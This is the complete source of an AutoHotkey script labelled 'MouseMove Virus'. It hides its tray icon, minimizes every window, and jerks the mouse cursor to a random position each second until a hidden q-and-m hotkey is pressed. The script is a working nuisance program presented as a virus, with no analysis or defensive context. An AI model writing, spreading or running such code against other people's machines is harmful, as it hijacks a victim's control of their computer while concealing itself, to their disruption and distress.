/*
  MouseMove Virus

  Description:-
	Moves the mouse randomly to any position.
*/

#NoEnv
#SingleInstance Force
#Persistent
#NoTrayIcon

SetBatchLines -1 ;For Speed

;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Code Begins

CoordMode, Mouse, Screen
SysGet, WorkArea, MonitorWorkArea, 1 ;Avoid the taskbar

WinMinimizeAll

SetTimer, Mous, 1000

Return	 ;End of Auto Execute Section
;_____________________________________________

Mous:
	Random, Xcord , 0, %WorkAreaRight%
	Random, Ycord , 0, %WorkAreaBottom%
	MouseMove, Xcord, Ycord, 0
Return

q & m::
Exitapp
